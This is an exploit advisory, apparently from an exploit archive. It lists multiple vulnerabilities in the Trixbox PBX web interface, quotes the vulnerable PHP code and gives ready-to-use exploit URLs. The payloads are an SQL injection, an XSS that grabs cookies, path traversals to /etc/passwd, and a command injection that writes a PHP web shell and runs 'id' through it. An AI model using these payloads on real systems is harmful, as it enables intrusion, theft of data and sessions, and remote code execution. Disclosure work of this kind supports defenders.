@@ -1,0 +1,179 @@
+id: 22449
+date: 07/18/2014
+title: Trixbox XSS / LFI / SQL Injection / Code Execution Vulnerabilities
+author: AtT4CKxT3rR0r1ST
+cves: 
+
+Trixbox All Version - Multiple Vulnerabilties
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.trixbox.com/
+####################################################################
+
+[1] Sql Injection
+===================
+VULNERABILITY
+##############
+[I] /var/www/html/maint/modules/endpointcfg/endpoint_generic.php
+
+Line 79-99:
+    case 'Submit':
+        $message = "";
+        $phone_vars['mac_address'] = cleanMAC($phone_vars['mac_address']);
+        if(!preg_match('/^[0-9A-F]{12}$/i', $phone_vars['mac_address']))
+{$message = "MAC is invalid";}
+        if ($phone_vars['freepbx_device']!="NONE") {  //get list of devices
+from FreePBX
+            $phone_vars = PopulateFromFreepbx($phone_vars);
+        }
+        else
+        {
+        $phone_vars['phone_label'] =
+$MACTABLE[substr($phone_vars['mac_address'],0,6)]['vendor'];
+
+        }
+
+        if ($_REQUEST['mac']){ // if there is an ID then edit an existing
+phone
+        $querytxt = "UPDATE Generic SET ";
+        foreach ($phone_vars as $key => $value) {
+         $querytxt .= $key. " = '" .trim($value). "',";
+        }
+        $querytxt .= "EditDate = NOW() WHERE mac_address='" .
+$_REQUEST['mac']."'";
+        $error = getSQL($querytxt,'endpoints');
+          }
+
+#########
+EXPLOIT
+#########
+
+Http://IP/maint/modules/endpointcfg/endpoint_generic.php?action=Submit&mac=1'
+and 1=2 union select 1,2,3,4,5,6-- -
+
+[2] Cross Site Scripting
+===========================
+VULNERABILITY
+##############
+[I] /var/www/html/user/help/html/index.php
+
+Line 44:
+                       $smarty->assign("id_nodo", $_GET['id_nodo']);
+
+#########
+EXPLOIT
+#########
+
+Http://IP/user/help/html/index.php?id_nodo="
+onmouseover%3dprompt(document.cookie) bad%3d"
+
+
+[3] Multiple Local File Include
+=================================
+VULNERABILITY
+##############
+[I] /var/www/html/maint/modules/home/index.php
+
+Line 68-72:
+
+$tbLang = $_GET['lang'];
+$languageFile = 'language/'.$tbLang.'.php';
+if(file_exists($languageFile)){
+    include($languageFile);
+}
+
+#########
+EXPLOIT
+#########
+
+Http://IP/maint/modules/home/index.php?lang=../../../../../../../../etc/passwd%00
+
+VULNERABILITY
+##############
+[II] /var/www/html/maint/modules/asterisk_info/asterisk_info.php
+
+Line 17-25:
+
+if(!empty($_GET['lang']) && isset($_GET['lang'])){
+    $tbLang = $_GET['lang'];
+}else{
+    $tbLang = 'english';
+}
+$languageFile = 'language/'.$tbLang.'.php';
+if(file_exists($languageFile)){
+    include($languageFile);
+}
+
+#########
+EXPLOIT
+#########
+Http://IP/maint/modules/asterisk_info/asterisk_info.php?lang=../../../../../../../../etc/passwd%00
+
+VULNERABILITY
+##############
+[III] /var/www/html/maint/modules/repo/repo.php
+
+Line 9-13:
+
+$tbLang = $_GET['lang'];
+$languageFile = 'language/'.$tbLang.'.php';
+if(file_exists($languageFile)){
+    include($languageFile);
+}
+
+#########
+EXPLOIT
+#########
+Http://IP/maint/modules/repo/repo.php?lang=../../../../../../../../etc/passwd%00
+
+VULNERABILITY
+##############
+[V] /var/www/html/maint/modules/endpointcfg/endpointcfg.php
+
+Line 29-33:
+
+if(!empty($_GET['lang']) && isset($_GET['lang'])){
+    $languageFile = includeLanguage($_GET['lang']);
+    include($languageFile);
+    $tbLang = $_GET['lang'];
+}else{
+
+#########
+EXPLOIT
+#########
+Http://IP/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00
+
+[4] Remote Code Execution
+===========================
+VULNERABILITY
+##############
+[I] /var/www/html/maint/modules/home/index.php
+
+Line 339:
+
+    $phpOutput = shell_exec('php -q libs/status.php '.$tbLang);//exec('perl
+libs/status.pl');
+
+Line 68:
+
+    $tbLang = $_GET['lang'];
+
+#########
+EXPLOIT
+#########
+
+Http://IP/maint/modules/home/index.php?lang=MF;echo "<?php
+system(\$_GET['cmd']);?> \$Greats 2 MY=\"Love:D">shell.php
+
+Your Shell
+
+Http://IP/maint/modules/home/shell.php?cmd=id
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) $Greats 2
+MY="Love:D
+####################################################################
+
+#  0day.today [2023-03-25]  #
